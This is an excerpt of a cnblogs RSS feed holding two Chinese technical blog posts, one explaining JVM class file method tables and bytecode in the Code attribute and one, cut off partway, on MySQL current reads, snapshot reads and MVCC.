+&lt;p&gt;code属性比较复杂，它是经过编译器编译成字节码指令之后的数据。就是说&lt;code&gt;java程序中的方法体经过javac编译器处理后，最终变成字节码存储在Code属性内&lt;/code&gt;。&lt;/p&gt;
+&lt;pre&gt;
+&lt;code&gt;并非所有方法表都有这个属性，接口和抽象类就没有【没有方法体】。
+Code属性是Class文件中最重要的一个属性，在Class文件中，Code属性用于描述代码，所有的其它数据项目都用来描述元数据，了解code属性对了解字
+节码执行引擎来说是必要基础。&lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1090617/201904/1090617-20190417235758419-1368030226.png&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Code属性表&lt;/strong&gt;的组成部分：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;机器指令——code&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;目前的&lt;strong&gt;JVM&lt;/strong&gt;使用一个字节表示机器操作码，即对&lt;strong&gt;JVM&lt;/strong&gt;底层而言，它能表示的机器操作码不多于&lt;strong&gt;2&lt;/strong&gt;的 &lt;strong&gt;8&lt;/strong&gt; 次方，即 &lt;strong&gt;256&lt;/strong&gt;个。&lt;strong&gt;class&lt;/strong&gt;文件中的机器指令部分是&lt;strong&gt;class&lt;/strong&gt;文件中最重要的部分，并且非常复杂。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;异常处理跳转信息&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;如果代码中出现了&lt;strong&gt;&lt;code&gt;try{}catch{}&lt;/code&gt;&lt;/strong&gt;块，那么&lt;strong&gt;try{}&lt;/strong&gt;块内的机器指令的地址范围记录下来，并且记录对应的&lt;strong&gt;catch{}&lt;/strong&gt;块中的起始机器指令地址，当运行时在&lt;strong&gt;try&lt;/strong&gt;块中有异常抛出的话，&lt;strong&gt;JVM&lt;/strong&gt;会将&lt;strong&gt;catch{}&lt;/strong&gt;块对应懂得其实机器指令地址传递给&lt;strong&gt;PC寄存器&lt;/strong&gt;，从而实现指令跳转；&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Java源码行号和机器指令的对应关系&lt;/code&gt;---LineNumberTable属性表&lt;/p&gt;
+&lt;p&gt;编译器在将java源码编译成class文件时，会将源码中的语句行号跟编译好的机器指令关联起来，这样的class文件加载到内存中并运行时，如果抛出异常，JVM可以根据这个对应关系，抛出异常信息，告诉我们我们的源码的多少行有问题，方便我们定位问题。&lt;/p&gt;
+&lt;p&gt;Code属性表结构体:&lt;/p&gt;
+&lt;p&gt;1、&lt;code&gt;attribute_name_index&lt;/code&gt; : 属性名称索引，占有2个字节，其内的值指向了常量池中的某一项，该项表示字符. 串“Code”;&lt;/p&gt;
+&lt;p&gt;2、&lt;code&gt;attribute_length&lt;/code&gt; : 属性长度，占有 4个字节，其内的值表示后面有多少个字节是属于此Code属性表的；&lt;/p&gt;
+&lt;p&gt;3、&lt;code&gt;max_stack&lt;/code&gt; : 操作数栈深度的最大值，占有 2 个字节，在方法执行的任意时刻，操作数栈都不应该超过这个值，虚拟机的运行的时候，会根据这个值来设置该方法对应的栈帧(Stack Frame)中的操作数栈的深度；&lt;/p&gt;
+&lt;p&gt;4、&lt;code&gt;max_locals&lt;/code&gt; 最大局部变量数目，占有 2个字节，其内的值表示局部变量表所需要的存储空间大小；&lt;/p&gt;
+&lt;p&gt;5、&lt;code&gt;code_length&lt;/code&gt; : 机器指令长度，占有 4 个字节，表示跟在其后的多少个字节表示的是机器指令；&lt;/p&gt;
+&lt;p&gt;6、&lt;code&gt;code&lt;/code&gt; 机器指令区域，该区域占有的字节数目由 code_length中的值决定。JVM最底层的要执行的机器指令就存储在这里；&lt;/p&gt;
+&lt;p&gt;7、&lt;code&gt;exception_table_length&lt;/code&gt; : 显式异常表长度，占有2个字节，如果在方法代码中出现了try{} catch()形式的结构，该值不会为空，紧跟其后会跟着若干个exception_table结构体，以表示异常捕获情况；&lt;/p&gt;
+&lt;p&gt;8、&lt;code&gt;exception_table&lt;/code&gt; : 显式异常表，占有8 个字节，start_pc,end_pc,handler_pc中的值都表示的是PC计数器中的指令地址。exception_table表示的意思是：如果字节码从第start_pc行到第end_pc行之间出现了catch_type所描述的异常类型，那么将跳转到handler_pc行继续处理。&lt;/p&gt;
+&lt;p&gt;9、&lt;code&gt;attribute_count&lt;/code&gt; : 属性计数器，占有 2 个字节，表示Code属性表的其他属性的数目&lt;/p&gt;
+&lt;p&gt;10、&lt;code&gt;attribute_info&lt;/code&gt; : 表示Code属性表具有的属性表，它主要分为两个类型的属性表：“LineNumberTable”类型和“LocalVariableTable”类型。“LineNumberTable”类型的属性表记录着Java源码和机器指令之间的对应关系“LocalVariableTable”类型的属性表记录着局部变量描述&lt;/p&gt;
+&lt;h4 id=&quot;constantvalue属性&quot;&gt;2、ConstantValue属性&lt;/h4&gt;
+&lt;p&gt;之所以学习这个，是因为后面类加载机制有联系到这个属性&lt;/p&gt;
+&lt;pre&gt;
+&lt;code&gt;这个属性的作用是通知虚拟机为静态变量赋值，只要被static修饰的变量才有这个属性，【有该属性的字段必须有ACC_STATIC访问标志，反过来不一定】。&lt;/code&gt;
+&lt;/pre&gt;
+&lt;pre&gt;
+&lt;code&gt;对于 &quot;int x = 123&quot; 和 &quot;static int x =123&quot;这类代码在日常编写中很常见，但虚拟机对这两种变量赋值的时刻却不同。
+对于非static变量[实例变量]，是在实例构造器&amp;lt;init&amp;gt;进行
+对于类变量,有两种方式选择
+①在类构造器&amp;lt;clinit&amp;gt;方法中赋值
+②使用ConstantValue属性初始化
+目前Sun javac编译器是这么做的【具体咋做不知道 = =】，如果同时使用final和static修饰一个变量[这种修饰就相当于个常量],并且是String或基本类型，就使用②，
+如果没有被final修饰或不是基本类型和String，就选择①在&amp;lt;clinit&amp;gt;方法中初始化
+//有关这点我在上篇博客举过例子，最后几句话也对这个解释的很清楚。&lt;/code&gt;
+&lt;/pre&gt;
+
+&lt;h2 id=&quot;三示例&quot;&gt;&lt;span&gt;三、示例&lt;/span&gt;&lt;/h2&gt;
+&lt;p&gt;有关方法的代码示例，我就不亲自测了，因为有位博主写的已经很清晰啦，我自己写也没那么清晰。&lt;/p&gt;
+&lt;h4 id=&quot;访问标志&quot;&gt;1、访问标志&lt;/h4&gt;
+&lt;pre&gt;
+&lt;code&gt;public static synchronized final void greeting(){  
+}  &lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;greeting()&lt;/strong&gt;方法的修饰符有：public、static、synchronized、final 这几个修饰符修饰，那么相对地，&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;greeting()&lt;/strong&gt;方法的访问标志中的&lt;code&gt;ACC_PUBLIC&lt;/code&gt;、&lt;code&gt;ACC_STATIC&lt;/code&gt;、&lt;code&gt;ACC_SYNCHRONIZED&lt;/code&gt;、&lt;code&gt;ACC_FINAL&lt;/code&gt;标志位都应该是&lt;strong&gt;1&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;从上面第一张图可以得出,该&lt;strong&gt;访问标志&lt;/strong&gt;的值应该是十六进制&lt;code&gt;0x0039&lt;/code&gt;。&lt;/p&gt;
+&lt;h4 id=&quot;名称索引和描述符索引&quot;&gt;2、名称索引和描述符索引&lt;/h4&gt;
+&lt;p&gt;紧接着&lt;strong&gt;访问标志（access_flags）&lt;/strong&gt;后面的&lt;strong&gt;两个字节&lt;/strong&gt;，叫做&lt;strong&gt;名称索引&lt;/strong&gt;(&lt;strong&gt;name_index&lt;/strong&gt;)，这两个字节中的值是指向了常量池中某个常量池项的索引，该常量池项表示这这个方法名称的字符串。&lt;/p&gt;
+&lt;p&gt;​ &lt;strong&gt;方法描述符索引(descrptor_index)&lt;/strong&gt;是紧跟在&lt;strong&gt;名称索引&lt;/strong&gt;后面的两个字节，这两个字节中的值跟名称索引中的值性质一样，都是指向了常量池中的某个常量池项。这两个字节中的指向的常量池项，&lt;strong&gt;是表示了方法描述符的字符串&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1090617/201904/1090617-20190417235837914-1194106857.jpg&quot;/&gt;&lt;/p&gt;
+&lt;h4 id=&quot;代码示例&quot;&gt;3、代码示例&lt;/h4&gt;
+&lt;pre&gt;
+&lt;code&gt;package com.louis.jvm;  
+public class Simple {  
+    public static synchronized final void greeting(){  
+        int a = 10;  
+    }  
+} &lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;1)、 &lt;code&gt;Simple.class文件如下所示&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1090617/201904/1090617-20190417235905646-2145707810.png&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;注意&lt;/code&gt; :方法表集合的头两个字节，即&lt;strong&gt;方法表计数器（method_count）&lt;/strong&gt;的值是&lt;strong&gt;0x0002&lt;/strong&gt;，它表示该类中有&lt;strong&gt;2&lt;/strong&gt; 个方法。注意到，我们的&lt;strong&gt;Simple.java&lt;/strong&gt;中就定义了一个greeting()方法，为什么&lt;strong&gt;class&lt;/strong&gt;文件中会显示有两个方法呢？&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;原因&lt;/code&gt;：如果我们在类中没有定义实例化构造方法，&lt;strong&gt;JVM&lt;/strong&gt;编译器在将源码编译成&lt;strong&gt;class&lt;/strong&gt;文件时，会自动地为这个类添加一个不带参数的实例化构造方法，这种添加是字节码级别的，JVM对所有的类实例化构造方法名采用了相同的名称：“”。如果我们显式地如下定义&lt;strong&gt;Simple()&lt;/strong&gt;构造函数，这个类编译出来的&lt;strong&gt;class&lt;/strong&gt;文件和上面的不带&lt;strong&gt;Simple&lt;/strong&gt;构造方法的&lt;strong&gt;Simple&lt;/strong&gt;类生成的&lt;strong&gt;class&lt;/strong&gt;文件是完全相同的。&lt;/p&gt;
+&lt;p&gt;2)、&lt;code&gt;Simple.class 中的&amp;lt;init&amp;gt;() 方法&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1090617/201904/1090617-20190417235935464-1875058370.png&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;解释：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;1、&lt;code&gt;方法访问标志(access_flags)&lt;/code&gt; ： 占有 &lt;strong&gt;2&lt;/strong&gt;个字节，值为&lt;strong&gt;0x0001&lt;/strong&gt;,即标志位的第 &lt;strong&gt;16&lt;/strong&gt; 位为 &lt;strong&gt;1&lt;/strong&gt;，所以该&lt;strong&gt;&amp;lt;init&amp;gt;()&lt;/strong&gt;方法的修饰符是：&lt;strong&gt;ACC_PUBLIC&lt;/strong&gt;;&lt;/p&gt;
+&lt;p&gt;2、 &lt;code&gt;名称索引(name_index)&lt;/code&gt;： 占有 &lt;strong&gt;2&lt;/strong&gt; 个字节，值为 &lt;strong&gt;0x0004&lt;/strong&gt;，指向常量池的第 &lt;strong&gt;4&lt;/strong&gt;项，该项表示字符串'&amp;lt;init&amp;gt;'，即该方法的名称是'&amp;lt;init&amp;gt;';&lt;/p&gt;
+&lt;p&gt;3、&lt;code&gt;描述符索引(descriptor_index)&lt;/code&gt;: 占有 &lt;strong&gt;2&lt;/strong&gt; 个字节，值为&lt;strong&gt;0x0005&lt;/strong&gt;,指向常量池的第 &lt;strong&gt;5&lt;/strong&gt; 项，该项表示字符串“&lt;strong&gt;()V&lt;/strong&gt;”，即表示该方法不带参数，并且无返回值（构造函数确实也没有返回值）；&lt;/p&gt;
+&lt;p&gt;4、&lt;code&gt;属性计数器（attribute_count)&lt;/code&gt; : 占有 &lt;strong&gt;2&lt;/strong&gt; 个字节，值为&lt;strong&gt;0x0001&lt;/strong&gt;,表示该方法表中含有一个属性表，后面会紧跟着一个属性表；&lt;/p&gt;
+&lt;p&gt;5、&lt;code&gt;属性表的名称索引(attribute_name_index)&lt;/code&gt; ：占有 &lt;strong&gt;2&lt;/strong&gt; 个字节，值为&lt;strong&gt;0x0006&lt;/strong&gt;,指向常量池中的第&lt;strong&gt;6&lt;/strong&gt; 项，该项表示字符串“&lt;strong&gt;Code&lt;/strong&gt;”，表示这个属性表是&lt;strong&gt;Code&lt;/strong&gt;类型的属性表；&lt;/p&gt;
+&lt;p&gt;6、 &lt;code&gt;属性长度（attribute_length)&lt;/code&gt;：占有&lt;strong&gt;4&lt;/strong&gt;个字节，值为&lt;strong&gt;0x0000 0011&lt;/strong&gt;，即十进制的 &lt;strong&gt;17&lt;/strong&gt;，表明后续的 &lt;strong&gt;17&lt;/strong&gt; 个字节可以表示这个&lt;strong&gt;Code&lt;/strong&gt;属性表的属性信息；&lt;/p&gt;
+&lt;p&gt;7、 &lt;code&gt;操作数栈的最大深度（max_stack）&lt;/code&gt;：占有&lt;strong&gt;2&lt;/strong&gt;个字节，值为&lt;strong&gt;0x0001&lt;/strong&gt;,表示栈帧中操作数栈的最大深度是&lt;strong&gt;1&lt;/strong&gt;；&lt;/p&gt;
+&lt;p&gt;8、&lt;code&gt;局部变量表的最大容量（max_variable）&lt;/code&gt;：占有&lt;strong&gt;2&lt;/strong&gt;个字节，值为&lt;strong&gt;0x0001&lt;/strong&gt;, &lt;strong&gt;JVM&lt;/strong&gt;在调用该方法时，根据这个值设置栈帧中的局部变量表的大小；&lt;/p&gt;
+&lt;p&gt;9、 &lt;code&gt;机器指令数目(code_length)&lt;/code&gt; ：占有&lt;strong&gt;4&lt;/strong&gt;个字节，值为&lt;strong&gt;0x0000 0005&lt;/strong&gt;,表示后续的&lt;strong&gt;5&lt;/strong&gt; 个字节 &lt;strong&gt;0x2A 、0xB7、 0x00、0x01、0xB1&lt;/strong&gt;表示机器指令;&lt;/p&gt;
+&lt;p&gt;10、&lt;code&gt;机器指令集(code[code_length])&lt;/code&gt;：这里共有 &lt;strong&gt;5&lt;/strong&gt;个字节，值为&lt;strong&gt;0x2A 、0xB7、 0x00、0x01、0xB1&lt;/strong&gt;；&lt;/p&gt;
+&lt;p&gt;11、&lt;code&gt;显式异常表集合（exception_table_count)&lt;/code&gt;： 占有&lt;strong&gt;2&lt;/strong&gt; 个字节，值为&lt;strong&gt;0x0000&lt;/strong&gt;,表示方法中没有需要处理的异常信息；&lt;/p&gt;
+&lt;p&gt;12、&lt;code&gt;Code属性表的属性表集合（attribute_count）&lt;/code&gt;： 占有&lt;strong&gt;2&lt;/strong&gt; 个字节，值为&lt;strong&gt;0x0000&lt;/strong&gt;，表示它没有其他的属性表集合，因为我们使用了&lt;strong&gt;-g:none&lt;/strong&gt; 禁止编译器生成&lt;strong&gt;Code属性表&lt;/strong&gt;的 &lt;strong&gt;LineNumberTable 和LocalVariableTable&lt;/strong&gt;;&lt;/p&gt;
+&lt;p&gt;解释下机器指令集：&lt;/p&gt;
+&lt;p&gt;​ &lt;code&gt;第一个字节 **0x2A&lt;/code&gt;：查询Java 虚拟机规范中关于操作码的解释，&lt;strong&gt;0x2A&lt;/strong&gt; 对应的操作是&quot;&lt;strong&gt;aload_0&lt;/strong&gt;&quot;,作用是将第一个引用类型局部变量推送至栈顶；&lt;/p&gt;
+&lt;p&gt;​ &lt;code&gt;第二个字节 0xB7&lt;/code&gt; :&lt;strong&gt;0xB7&lt;/strong&gt; 对应的操作是：&quot;&lt;strong&gt;invokespecial&lt;/strong&gt;&quot;,作用是调用超类构造方法、实例初始化方法或私有方法；&lt;strong&gt;它带有2个字节的参数，即后面的 0x00、0x01 是它的参数&lt;/strong&gt;，这个参数是某个常量池中的索引，指向了常量池的第一项，该项表示一个方法引用项&lt;strong&gt;CONSTANT_Methodref_info&lt;/strong&gt;结构体，表示&lt;strong&gt;java.lang.Object&lt;/strong&gt; 类中的&lt;strong&gt;&amp;lt;init&amp;gt;()&lt;/strong&gt;方法，即 &lt;strong&gt;java/lang/Object.&quot;&amp;lt;init&amp;gt;&quot;:()V&lt;/strong&gt;。这条指令的意思就是调用父类Object的构造方法&lt;strong&gt;&amp;lt;init&amp;gt;()&lt;/strong&gt;；&lt;/p&gt;
+&lt;p&gt;​ &lt;code&gt;第5个字符是0xB1&lt;/code&gt; : 对应操作是：“&lt;strong&gt;Ireturn&lt;/strong&gt;”,作用是表示无返回值的方法返回，结束方法调用，这条语句放在方法的机器码最后，表示方法结束调用，返回。&lt;/p&gt;
+&lt;p&gt;我们可以使用&lt;strong&gt;javap -v Simple &amp;gt; Simple.txt&lt;/strong&gt;，查看反编译信息是怎样显示这一信息的：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1090617/201904/1090617-20190418000014962-41313099.png&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;3）&lt;code&gt;Simple.class 中的greeting() 方法&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1090617/201904/1090617-20190418000144389-473149865.png&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;解释：&lt;/p&gt;
+&lt;p&gt;1、&lt;code&gt;方法访问标志(access_flags)&lt;/code&gt;： 占有 &lt;strong&gt;2&lt;/strong&gt;个字节，值为 &lt;strong&gt;0x0039&lt;/strong&gt; ,即二进制的&lt;strong&gt;00000000 00111001&lt;/strong&gt;,即标志位的第&lt;strong&gt;11、12、13、16&lt;/strong&gt;位为&lt;strong&gt;1&lt;/strong&gt;，根据上面讲的方法标志位的表示，可以得到该&lt;strong&gt;greeting()&lt;/strong&gt;方法的修饰符有：&lt;strong&gt;ACC_SYNCHRONIZED、ACC_FINAL、ACC_STATIC、ACC_PUBLIC&lt;/strong&gt;;&lt;/p&gt;
+&lt;p&gt;2、 &lt;code&gt;名称索引(name_index)&lt;/code&gt;： 占有 &lt;strong&gt;2&lt;/strong&gt; 个字节，值为 &lt;strong&gt;0x0007&lt;/strong&gt;，指向常量池的第 &lt;strong&gt;7&lt;/strong&gt; 项，该项表示字符串“&lt;strong&gt;greeting&lt;/strong&gt;”，即该方法的名称是“&lt;strong&gt;greeting&lt;/strong&gt;”;&lt;/p&gt;
+&lt;p&gt;3、&lt;code&gt;描述符索引(descriptor_index)&lt;/code&gt;: 占有 &lt;strong&gt;2&lt;/strong&gt; 个字节，值为&lt;strong&gt;0x0005&lt;/strong&gt;,指向常量池的第 &lt;strong&gt;5&lt;/strong&gt; 项，该项表示字符串“&lt;strong&gt;()V&lt;/strong&gt;”，即表示该方法不带参数，并且无返回值；&lt;/p&gt;
+&lt;p&gt;4、&lt;code&gt;属性计数器（attribute_count)&lt;/code&gt;: 占有 &lt;strong&gt;2&lt;/strong&gt; 个字节，值为&lt;strong&gt;0x0001&lt;/strong&gt;,表示该方法表中含有一个属性表，后面会紧跟着一个属性表；&lt;/p&gt;
+&lt;p&gt;5、&lt;code&gt;属性表的名称索引(attribute_name_index)&lt;/code&gt; ：占有 &lt;strong&gt;2&lt;/strong&gt; 个字节，值为&lt;strong&gt;0x0006&lt;/strong&gt;,指向常量池中的第&lt;strong&gt;6&lt;/strong&gt; 项，该项表示字符串“&lt;strong&gt;Code&lt;/strong&gt;”，表示这个属性表是&lt;strong&gt;Code&lt;/strong&gt;类型的属性表；&lt;/p&gt;
+&lt;p&gt;6、&lt;code&gt;属性长度（attribute_length）&lt;/code&gt;：占有&lt;strong&gt;4&lt;/strong&gt;个字节，值为&lt;strong&gt;0x0000 0010&lt;/strong&gt;，即十进制的&lt;strong&gt;16&lt;/strong&gt;，表明后续的&lt;strong&gt;16&lt;/strong&gt;个字节可以表示这个&lt;strong&gt;Code&lt;/strong&gt;属性表的属性信息；&lt;/p&gt;
+&lt;p&gt;7、&lt;code&gt;操作数栈的最大深度（max_stack）&lt;/code&gt; ：占有&lt;strong&gt;2&lt;/strong&gt;个字节，值为&lt;strong&gt;0x0001&lt;/strong&gt;,表示栈帧中操作数栈的最大深度是&lt;strong&gt;1&lt;/strong&gt;；&lt;/p&gt;
+&lt;p&gt;8、 &lt;code&gt;局部变量表的最大容量（max_variable）&lt;/code&gt;：占有&lt;strong&gt;2&lt;/strong&gt;个字节，值为&lt;strong&gt;0x0001&lt;/strong&gt;, &lt;strong&gt;JVM&lt;/strong&gt;在调用该方法时，根据这个值设置栈帧中的局部变量表的大小；&lt;/p&gt;
+&lt;p&gt;9、&lt;code&gt;器指令数目(code_length)&lt;/code&gt;：占有&lt;strong&gt;4&lt;/strong&gt; 个字节，值为&lt;strong&gt;0x0000 0004,&lt;/strong&gt;表示后续的&lt;strong&gt;4&lt;/strong&gt;个字节&lt;strong&gt;0x10、 0x0A、 0x3B、0xB1&lt;/strong&gt;的是表示机器指令;&lt;/p&gt;
+&lt;p&gt;10、&lt;code&gt;机器指令集(code[code_length])&lt;/code&gt;：这里共有&lt;strong&gt;4&lt;/strong&gt; 个字节，值为&lt;strong&gt;0x10、 0x0A、 0x3B、0xB1&lt;/strong&gt; ；&lt;/p&gt;
+&lt;p&gt;11、&lt;code&gt;显式异常表集合（exception_table_count）&lt;/code&gt;： 占有&lt;strong&gt;2&lt;/strong&gt; 个字节，值为&lt;strong&gt;0x0000&lt;/strong&gt;,表示方法中没有需要处理的异常信息；&lt;/p&gt;
+&lt;p&gt;12 &lt;code&gt;Code属性表的属性表集合（attribute_count）&lt;/code&gt;： 占有&lt;strong&gt;2&lt;/strong&gt; 个字节，值为&lt;strong&gt;0x0000&lt;/strong&gt;，表示它没有其他的属性表集合，因为我们使用了&lt;strong&gt;-g:none&lt;/strong&gt; 禁止编译器生成&lt;strong&gt;Code属性表&lt;/strong&gt;的 &lt;strong&gt;LineNumberTable 和LocalVariableTable&lt;/strong&gt;;&lt;/p&gt;
+&lt;p&gt;指令集解释&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;第一个字节 0x10&lt;/code&gt; : 查询Java虚拟机规范中关于操作码的解释，0x10 对应的操作是&quot;bipush&quot;,&quot; 作用是将单字节的常量值（-128~127） 推送至栈顶，它要求一个参数，后面的 0x0A 即是需要推送到栈顶的单字节，注意这里的 0x0A 是16进制，就是我们在代码里写的&quot;a=10&quot;中的10。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;第三个字节&quot;3B&quot;&lt;/code&gt; : “3B”对应的操作是：&quot;istore_0&quot;,作用是将栈顶int 型数值存入第一个局部变量。我们在greeting() 方法中就声明了一个局部变量a，JVM的运行的时候，将这个局部变量a解析，并放置到局部变量表中的第一个位置；上述的0x10 0x0A 指令已经将0x0A 推送到了栈顶了，然后 0x3B指令便将栈顶的0x0A 取出，赋值给局部变量表中的第一个参数，即局部变量a，这样就完成了对局部变量a的赋值；&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;第4个字符是0xB1&lt;/code&gt; : 对应操作是：“Ireturn”,作用是表示无返回值的方法返回，结束方法调用，这条语句放在方法的机器码最后，表示方法结束调用，返回。&lt;/p&gt;
+&lt;p&gt;我们可以使用javap -v Simple &amp;gt; Simple.txt，查看反编译信息是怎样显示这一信息的：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1090617/201904/1090617-20190418000205085-433084652.png&quot;/&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;参考&quot;&gt;&lt;span&gt;参考&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;这篇文章基本上是参考，非常感谢作者分享，写的很清楚:&lt;a href=&quot;https://blog.51cto.com/1459294/1932334&quot;&gt;《Java虚拟机原理图解》&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;
+&lt;code&gt;只要自己变优秀了，其他的事情才会跟着好起来（少将6）&lt;/code&gt;
+&lt;/pre&gt;</description>
+<pubDate>Wed, 17 Apr 2019 16:19:00 +0000</pubDate>
+<dc:creator>雨点的名字</dc:creator>
+<og:description>【JVM虚拟机】(8) 深入理解Class中 方法、属性表集合 之前有关class文件已经写了两篇博客： 1、 '【JVM虚拟机】(5) 深入理解JVM Class中常量池' 2、 '【JVM虚拟机】</og:description>
+<dc:language>zh-cn</dc:language>
+<dc:format>text/html</dc:format>
+<dc:identifier>http://www.cnblogs.com/qdhxhz/p/10727117.html</dc:identifier>
+</item>
+<item>
+<title>【MySQL】当前读、快照读、MVCC - wwcom123</title>
+<link>http://www.cnblogs.com/wwcom123/p/10727194.html</link>
+<guid isPermaLink="true" >http://www.cnblogs.com/wwcom123/p/10727194.html</guid>
+<description>&lt;div readability=&quot;31&quot;&gt;
+&lt;ul&gt;&lt;li&gt;
+&lt;h2&gt;&lt;span&gt;当前读:&lt;/span&gt;&lt;/h2&gt;
+&lt;/li&gt;
+&lt;/ul&gt;&lt;p&gt;&lt;span&gt;　　select...lock in share mode (共享读锁)&lt;/span&gt;&lt;br/&gt;&lt;span&gt;　　select...for update&lt;/span&gt;&lt;br/&gt;&lt;span&gt;　　update , delete , insert&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;　　当前读, 读取的是最新版本, 并且对读取的记录加锁, 阻塞其他事务同时改动相同&lt;/span&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;记录&lt;/span&gt;&lt;/span&gt;&lt;span&gt;，避免出现安全问题。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&lt;span&gt;　　例如，假设要update一条记录，但是另一个事务已经delete这条数据并且commit了，如果不加锁就会产生冲突。所以update的时候肯定要是当前读，得到最新的信息并且锁定相应的记录。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
+
+&lt;ul&gt;&lt;li&gt;
+&lt;h2&gt;&lt;span&gt;当前读的实现方式：next-key锁(&lt;/span&gt;行记录锁+&lt;span&gt;Gap间隙锁)&lt;/span&gt;&lt;/h2&gt;
+&lt;/li&gt;
+&lt;/ul&gt;&lt;p&gt; &lt;span&gt;　　&lt;strong&gt;间隙锁：&lt;/strong&gt;只有在Read Repeatable、Serializable隔离级别才有，就是锁定那些范围空间内的数据，假设锁定id&amp;gt;3的数据，id有3,4,5，那么4，5和后面的数字都会被锁定，像6,7...，为什么要这样？因为如果我们不锁定没有的数据，当加入了新的数据id=6，就会出现幻读，间隙锁避免了幻读。&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;　　对主键或唯一索引，如果select查询时where条件全部精确命中(=或者in)，这种场景本身就不会出现幻读，所以只会加行记录锁。&lt;/span&gt;&lt;/p&gt;
+
+&lt;/div&gt;
+&lt;ul&gt;&lt;li&gt;
+&lt;h2&gt;&lt;span&gt; 快照读&lt;/span&gt;&lt;/h2&gt;
+&lt;/li&gt;
+&lt;/ul&gt;&lt;p&gt;　　&lt;span&gt;简单的select操作(不包括 select ... lock in share mode, select ... for update)。&lt;/span&gt;　　　　&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;　　Read Committed隔离级别：每次select都生成一个快照读。&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;　　Read Repeatable隔离级别：&lt;/span&gt;&lt;strong&gt;&lt;span&gt;开启事务后第一个select语句才是快照读的地方，而不是一开启事务就快照读。&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;&lt;li&gt;
+&lt;h2&gt;快照读的实现方式：u&lt;span&gt;ndolog和MVCC&lt;/span&gt;&lt;/h2&gt;
+&lt;/li&gt;
+&lt;/ul&gt;&lt;div readability=&quot;12&quot;&gt;
+&lt;div readability=&quot;19&quot;&gt;
+&lt;p&gt;&lt;span&gt;　&lt;span&gt;　&lt;strong&gt;undolog&lt;/strong&gt;:&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&lt;span&gt;　　每行除了数据外 还有&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;　　&lt;strong&gt;DB_TRX_ID&lt;/strong&gt;: 6字节&lt;code&gt;DB_TRX_ID&lt;/code&gt;字段，表示最后更新的事务id(update,delete,insert)。此外，删除在内部被视为更新，其中行中的特殊位被设置为将其标记为已软删除。&lt;br/&gt;　　&lt;strong&gt;DB_ROLL_PTR&lt;/strong&gt;: 7字节回滚指针，指向前一个版本的undolog记录，组成undo链表。如果更新了行，则撤消日志记录包含在更新行之前重建行内容所需的信息。&lt;br/&gt;　　&lt;strong&gt;DB_ROW_ID&lt;/strong&gt;: &lt;/span&gt;&lt;span&gt;6字节的DB_ROW_ID字段，包含一个随着新行插入而单调递增的行ID, 当由innodb自动产生聚集索引时，聚集索引会包括这个行ID的值，否则这个行ID不会出现在任何索引中。&lt;/span&gt;&lt;span&gt;如果表中没有主键或合适的唯一索引, 也就是无法生成聚簇索引的时候, InnoDB会帮我们自动生成聚集索引, 聚簇索引会使用DB_ROW_ID的值来作为主键; 如果表中有主键或者合适的唯一索引, 那么聚簇索引中也就不会包含 DB_ROW_ID了 。&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em id=&quot;__mceDel&quot;&gt;&lt;em id=&quot;__mceDel&quot;&gt; &lt;/em&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;ul readability=&quot;0&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
+&lt;p&gt;&lt;span&gt;insert undo log: 只在事务回滚时需要, 事务提交就可以删掉了。&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li readability=&quot;0&quot;&gt;
+&lt;p&gt;&lt;span&gt;update undo log: 包括update 和 delete , 回滚和快照读 都需要。&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;&lt;div class=&quot;image-package&quot; readability=&quot;13&quot;&gt;
